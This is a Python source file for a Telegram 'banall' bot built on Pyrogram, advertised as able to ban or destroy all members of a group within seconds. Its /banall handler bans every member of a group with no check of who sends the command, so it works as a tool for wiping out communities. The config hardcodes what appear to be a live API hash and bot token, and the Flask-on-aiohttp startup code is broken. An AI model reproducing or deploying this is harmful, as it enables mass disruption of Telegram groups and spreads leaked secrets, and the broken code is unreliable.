import os
import logging
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
import threading
import asyncio
from aiohttp import web

# लॉगिंग सेटअप
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# Flask app
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "Flask app is running on port 8000!"

# Config vars
API_ID = int(os.getenv("API_ID", "16457832"))
API_HASH = os.getenv("API_HASH", "3030874d0befdb5d05597deacc3e83ab")
BOT_TOKEN = os.getenv("BOT_TOKEN", "7538146982:AAGeiAfuNVs-gEK1gfOHcPuwbv_5JCv2nvo")
LOGGER_GROUP_ID = int(os.getenv("LOGGER_GROUP_ID", "-1002043570167"))  # लॉगर ग्रुप ID
OWNER = os.getenv("OWNER", "BABY09_WORLD")

# Pyrogram client
app_pyrogram = Client(
    "banall",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

# Function to send startup message
async def send_startup_message():
    bot = await app_pyrogram.get_me()  # बॉट की जानकारी प्राप्त करें
    try:
        await app_pyrogram.send_message(
            chat_id=LOGGER_GROUP_ID,
            text=f"**Bot Started**\n\n"
                 f"**Name:** [{bot.first_name}](tg://user?id={bot.id})\n"
                 f"**ID:** `{bot.id}`\n"
                 f"**Username:** @{bot.username}"
        )
    except Exception as e:
        logging.error(f"Failed to send startup message: {e}")

# /start कमांड का हैंडलर
@app_pyrogram.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    user_mention = message.from_user.mention  # यूजर का मेंशन नाम प्राप्त करें
    try:
        # बॉट का संदेश उपयोगकर्ता को भेजें
        await message.reply_photo(
            photo=f"https://telegra.ph/file/62e2e9fc93cd51219264f.jpg",
            caption=f"╭───────────────────⦿\n│❍ • ʜᴇʏ ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ʙᴀɴ •\n│❍ • ᴀʟʟ ʙᴏᴛ ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ •\n│• ᴘʏʀᴏɢʀᴀᴍ •\n│❍ • ʟɪʙʀᴀʀʏ ᴛᴏ ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ •\n│❍ • ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴘ •\n│• ᴡɪᴛʜ ɪɴ ᴀ ғᴇᴡ sᴇᴄᴏɴᴅs •\n│❍ • ɴᴏ sᴛᴏᴘ + ɴᴏ ʟᴀɢ •\n├───────────────────⦿\n│❍ • ᴛʏᴘᴇ /ʙᴀɴᴀʟʟ ᴛᴏ ꜱᴇᴇ ᴍᴀɢɪᴄ ɪɴ │ • ɢʀᴏᴜᴘ •\n│❍ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ➛ [ʙᴧʙʏ-ᴍᴜsɪᴄ™](https://t.me/BABY09_WORLD) • \n╰───────────────────⦿",
            reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            "Cʜᴇᴄᴋ ❍ᴡɴᴇʀ", url=f"https://t.me/{OWNER}")
                    ]
                ]
            )
        )
        # लॉगर ग्रुप में संदेश भेजें
        await client.send_message(
            chat_id=LOGGER_GROUP_ID,
            text=f"{user_mention} just started the bot!"
        )
        logging.info(f"Start command logged for {message.from_user.id}")
    except Exception as e:
        logging.error(f"Failed to handle start command: {e}")

@app_pyrogram.on_message(filters.command("banall") & filters.group)
async def banall_command(client: Client, message: Message):
    print(f"Getting members from {message.chat.id}")
    async for member in client.get_chat_members(message.chat.id):
        try:
            await client.ban_chat_member(chat_id=message.chat.id, user_id=member.user.id)
            print(f"Kicked {member.user.id} from {message.chat.id}")
        except Exception as e:
            print(f"Failed to kick {member.user.id}: {e}")
    print("Process completed")

# Flask और Pyrogram बॉट रन करना
async def run_flask():
    loop = asyncio.get_event_loop()
    runner = web.AppRunner(app_flask)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 8000)
    await site.start()

# Main entry point for async Pyrogram bot
async def run_pyrogram():
    await app_pyrogram.start()
    print("Banall-Bot Booted Successfully")
    await send_startup_message()  # बॉट स्टार्ट मैसेज भेजें
    await idle()

# Main function to run both Flask and Pyrogram
async def main():
    # Start Flask and Pyrogram simultaneously
    flask_task = asyncio.create_task(run_flask())
    pyrogram_task = asyncio.create_task(run_pyrogram())
    
    await asyncio.gather(flask_task, pyrogram_task)

if __name__ == "__main__":
    asyncio.run(main())
